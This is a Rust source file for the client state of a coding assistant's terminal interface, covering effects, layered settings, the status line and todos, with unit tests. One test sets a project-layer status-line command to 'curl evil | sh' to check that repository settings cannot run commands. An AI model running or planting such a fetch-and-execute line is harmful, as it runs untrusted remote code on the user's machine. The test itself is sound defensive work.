//! Client state for the coding surface (M4.6 track H): modes, queued input, history, attachments,
//! the todo and job strips, the panels' data, and the work the client asks its run loop to do.
//!
//! The reducer stays pure. Anything that touches the machine (a status-line command, the file
//! walk for `@`, the clipboard, the editor) is an [`Effect`] the state queues and the run loop
//! executes on a worker thread; the answer comes back as a [`LocalEvent`] through the same
//! `on_client` door the daemon's events use, so a test feeds both by hand.

use std::collections::{BTreeMap, HashMap};

use marlowe_proto::{
    AgentTypeInfo, CheckpointInfo, CommandInfo, CostReport, HookInfo, JobInfo, McpServerInfo, PermissionMode, RuleInfo,
    SettingsLayer, SettingsScope, TodoItem,
};
use serde_json::Value;

use crate::attach::{Attachment, Upload};
use crate::diff::Diff;
use crate::history::History;
use crate::links::LinkConfig;
use crate::panel::Panel;

/// Work for the run loop. Executed off the UI thread; the answer is a [`LocalEvent`].
#[derive(Debug, Clone, PartialEq)]
pub enum Effect {
    /// Run `statusline.command` with `input` (JSON) on stdin.
    Statusline { command: String, input: String, cwd: Option<String> },
    /// Walk `root` (gitignore-aware) for the `@` picker.
    IndexFiles { root: String },
    /// Read an image off the clipboard.
    ClipboardImage,
    /// Read an image file.
    ReadImage { path: String },
    /// Open `path` in `$VISUAL`/`$EDITOR`, handing the terminal over until it exits.
    OpenEditor { path: String },
    /// Write `text` to `path` (`/export`).
    WriteFile { path: String, text: String },
    /// Find the instruction files for `/memory`.
    FindInstructions { workspace: Option<String> },
}

/// Where an image came from.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ImageSource {
    Clipboard,
    Path(String),
}

/// One instruction file `/memory` can open.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct InstructionFile {
    pub path: String,
    /// `project`, `user`, `local`.
    pub scope: String,
    pub exists: bool,
}

/// The answer to an [`Effect`].
#[derive(Debug, Clone, PartialEq)]
pub enum LocalEvent {
    /// The first line the status-line command printed (ANSI removed), or why it failed.
    Statusline(Result<String, String>),
    FileIndex { root: String, files: Vec<String> },
    Image { source: ImageSource, result: Result<(String, Vec<u8>), String> },
    EditorClosed { path: String, result: Result<(), String> },
    Written { path: String, result: Result<(), String> },
    Instructions(Vec<InstructionFile>),
}

/// What the client keeps about a tool call beyond its one line: the full summary, the diff it made,
/// for Ctrl+O and the inline diff.
#[derive(Debug, Clone, Default, PartialEq)]
pub struct ToolDetail {
    pub tool: String,
    /// Everything `ToolStarted.summary` said (the first line is the tool line).
    pub started: String,
    /// Everything `ToolFinished.summary` said, beyond its first line when it has several.
    pub output: String,
    pub diff: Option<Diff>,
    pub ok: Option<bool>,
}

/// The status line.
#[derive(Debug, Clone, Default, PartialEq)]
pub struct StatusLine {
    /// What the command last printed.
    pub text: Option<String>,
    pub error: Option<String>,
    /// The input changed since the command last ran.
    pub dirty: bool,
    pub last_run_ms: i64,
    pub running: bool,
    /// What the command last ran with, so an unchanged input does not run it again.
    pub last_input: String,
}

/// Settings as the daemon reports them.
#[derive(Debug, Clone, Default, PartialEq)]
pub struct Settings {
    pub layers: Vec<SettingsLayer>,
    /// Dotted key to its effective value and the layer it comes from. Later layers win.
    pub merged: BTreeMap<String, (Value, SettingsScope)>,
    /// The same keys read from the user layer alone: what the user wrote, never a cloned repo.
    pub user: BTreeMap<String, Value>,
}

impl Settings {
    pub fn from_layers(layers: &[SettingsLayer]) -> Settings {
        let rank = |s: SettingsScope| match s {
            SettingsScope::User => 0,
            SettingsScope::Project => 1,
            SettingsScope::Local => 2,
            SettingsScope::Session => 3,
        };
        let mut sorted: Vec<&SettingsLayer> = layers.iter().collect();
        sorted.sort_by_key(|l| rank(l.scope));
        let mut merged = BTreeMap::new();
        let mut user_only = BTreeMap::new();
        for l in sorted {
            if let Ok(t) = l.text.parse::<toml::Table>() {
                flatten("", &Value::from(table_json(&t)), l.scope, &mut merged);
                if l.scope == SettingsScope::User {
                    flatten("", &Value::from(table_json(&t)), l.scope, &mut user_only);
                }
            }
        }
        let user = user_only.into_iter().map(|(k, (v, _))| (k, v)).collect();
        Settings { layers: layers.to_vec(), merged, user }
    }

    pub fn get(&self, key: &str) -> Option<&Value> {
        self.merged.get(key).map(|(v, _)| v)
    }

    pub fn str(&self, key: &str) -> Option<&str> {
        self.get(key).and_then(Value::as_str).map(str::trim).filter(|s| !s.is_empty())
    }

    /// A string setting that makes the client run or open something (`statusline.command`,
    /// `editor_url`). Only the user's own layer counts: a project or local layer arrives with a
    /// cloned repository, and a repository does not get to run a command as the user.
    pub fn user_str(&self, key: &str) -> Option<&str> {
        self.user.get(key).and_then(Value::as_str).map(str::trim).filter(|s| !s.is_empty())
    }

    pub fn bool(&self, key: &str) -> Option<bool> {
        self.get(key).and_then(Value::as_bool)
    }

    /// The layer a key's effective value comes from.
    pub fn source(&self, key: &str) -> Option<SettingsScope> {
        self.merged.get(key).map(|(_, s)| *s)
    }
}

fn table_json(t: &toml::Table) -> serde_json::Map<String, Value> {
    t.iter().map(|(k, v)| (k.clone(), toml_json(v))).collect()
}

fn toml_json(v: &toml::Value) -> Value {
    match v {
        toml::Value::String(s) => Value::String(s.clone()),
        toml::Value::Integer(i) => Value::from(*i),
        toml::Value::Float(f) => Value::from(*f),
        toml::Value::Boolean(b) => Value::Bool(*b),
        toml::Value::Datetime(d) => Value::String(d.to_string()),
        toml::Value::Array(a) => Value::Array(a.iter().map(toml_json).collect()),
        toml::Value::Table(t) => Value::Object(table_json(t)),
    }
}

/// Tables become dotted keys; arrays of tables (rules, hooks) stay whole under their key.
fn flatten(prefix: &str, v: &Value, scope: SettingsScope, out: &mut BTreeMap<String, (Value, SettingsScope)>) {
    match v {
        Value::Object(m) => {
            for (k, v) in m {
                let key = if prefix.is_empty() { k.clone() } else { format!("{prefix}.{k}") };
                flatten(&key, v, scope, out);
            }
        }
        other => {
            if !prefix.is_empty() {
                out.insert(prefix.to_string(), (other.clone(), scope));
            }
        }
    }
}

/// Running totals for the status line and `/cost`, from `TurnFinished`.
#[derive(Debug, Clone, Copy, Default, PartialEq)]
pub struct Totals {
    pub input: u64,
    pub output: u64,
    pub usd: f64,
    pub turns: u32,
}

/// An `ask_user` or approval-adjacent request that arrived while nothing could show it.
#[derive(Debug, Clone, Default)]
pub struct Coding {
    /// The session's permission mode (Shift+Tab cycles it).
    pub mode: PermissionMode,
    /// A mode chosen before a session existed; sent once there is one.
    pub pending_mode: Option<PermissionMode>,
    pub todos: Vec<TodoItem>,
    /// The todo strip is shown (it is, while any item is open).
    pub todos_hidden: bool,
    pub jobs: Vec<JobInfo>,
    /// Messages typed while a turn ran, sent at the next step boundary.
    pub queue: Vec<String>,
    pub attachments: Vec<Attachment>,
    pub next_image: u32,
    pub upload: Option<Upload>,
    /// A `!` command typed before a session existed.
    pub pending_shell: Option<String>,
    pub history: History,
    pub search: Option<Search>,
    /// What was typed in the sessions picker to narrow it.
    pub sessions_query: String,
    /// The highlighted row of the slash or `@` popup.
    pub popup_sel: usize,
    /// Esc closed the popup for this composer text.
    pub popup_dismissed: Option<String>,
    pub panel: Option<Panel>,
    pub rules: Option<Vec<RuleInfo>>,
    pub hooks: Option<Vec<HookInfo>>,
    pub agents: Option<Vec<AgentTypeInfo>>,
    pub mcp: Option<Vec<McpServerInfo>>,
    pub commands: Vec<CommandInfo>,
    pub settings: Option<Settings>,
    pub checkpoints: Option<Vec<CheckpointInfo>>,
    pub cost: Option<CostReport>,
    pub instructions: Option<Vec<crate::coding::InstructionFile>>,
    pub tool_detail: HashMap<String, ToolDetail>,
    pub links: LinkConfig,
    /// The links on the frame just drawn, for the run loop (written by the renderer).
    pub link_plan: std::cell::RefCell<Vec<crate::links::LinkRegion>>,
    pub effects: Vec<Effect>,
    pub file_index: Option<Vec<String>>,
    pub index_root: Option<String>,
    pub statusline: StatusLine,
    pub totals: Totals,
    /// The settings, commands and mode requests that follow a Welcome have gone out.
    pub bootstrapped: bool,
    /// The workspace the commands were listed for.
    pub boot_ws: Option<String>,
    /// Connect-time requests whose "not available yet" answers are not worth a message.
    pub quiet_ops: u8,
    /// Requests this daemon has answered with "not available yet".
    pub unavailable: std::collections::BTreeSet<String>,
    /// `/fork` was sent: the next session reply is the copy, to open.
    pub expect_fork: bool,
    /// `/export` was sent for this session title and format, for the file name.
    pub export_name: Option<String>,
}

/// Ctrl+R: a reverse search through the prompt history.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct Search {
    pub query: String,
    /// Which match, newest first.
    pub sel: usize,
    /// The composer as it was, restored on Esc.
    pub original: String,
}

impl Coding {
    pub fn queue_len(&self) -> usize {
        self.queue.len()
    }

    /// Open todo items (not completed).
    pub fn open_todos(&self) -> usize {
        self.todos.iter().filter(|t| t.status != marlowe_proto::TodoStatus::Completed).count()
    }

    pub fn running_jobs(&self) -> usize {
        self.jobs.iter().filter(|j| j.exit_code.is_none()).count()
    }

    pub fn statusline_command(&self) -> Option<&str> {
        self.settings.as_ref().and_then(|s| s.user_str("statusline.command"))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn layer(scope: SettingsScope, text: &str) -> SettingsLayer {
        SettingsLayer { scope, path: None, text: text.into() }
    }

    #[test]
    fn later_layers_win_and_the_source_is_remembered() {
        let s = Settings::from_layers(&[
            layer(SettingsScope::Local, "editor_url = \"cursor://file/{path}:{line}\"\n[statusline]\ncommand = \"echo local\"\n"),
            layer(SettingsScope::User, "editor_url = \"vscode://file/{path}:{line}\"\n[network]\nallow_hosts = [\"pypi.org\"]\n"),
            layer(SettingsScope::Project, "[statusline]\ncommand = \"echo project\"\n"),
        ]);
        assert_eq!(s.str("editor_url"), Some("cursor://file/{path}:{line}"));
        assert_eq!(s.source("editor_url"), Some(SettingsScope::Local));
        assert_eq!(s.str("statusline.command"), Some("echo local"));
        assert_eq!(s.get("network.allow_hosts"), Some(&serde_json::json!(["pypi.org"])));
        assert_eq!(s.source("network.allow_hosts"), Some(SettingsScope::User));
    }

    #[test]
    fn executable_settings_come_from_the_user_layer_only() {
        let s = Settings::from_layers(&[
            layer(SettingsScope::Project, "[statusline]\ncommand = \"curl evil | sh\"\n"),
            layer(SettingsScope::Local, "editor_url = \"x://{path}\"\n"),
        ]);
        assert_eq!(s.str("statusline.command"), Some("curl evil | sh"));
        assert_eq!(s.user_str("statusline.command"), None);
        assert_eq!(s.user_str("editor_url"), None);
        let s = Settings::from_layers(&[
            layer(SettingsScope::User, "[statusline]\ncommand = \"echo mine\"\n"),
            layer(SettingsScope::Project, "[statusline]\ncommand = \"echo theirs\"\n"),
        ]);
        assert_eq!(s.user_str("statusline.command"), Some("echo mine"));
    }

    #[test]
    fn a_layer_that_does_not_parse_is_skipped_not_fatal() {
        let s = Settings::from_layers(&[layer(SettingsScope::User, "this is = = not toml"), layer(SettingsScope::Project, "a = 1")]);
        assert_eq!(s.get("a"), Some(&serde_json::json!(1)));
    }
}
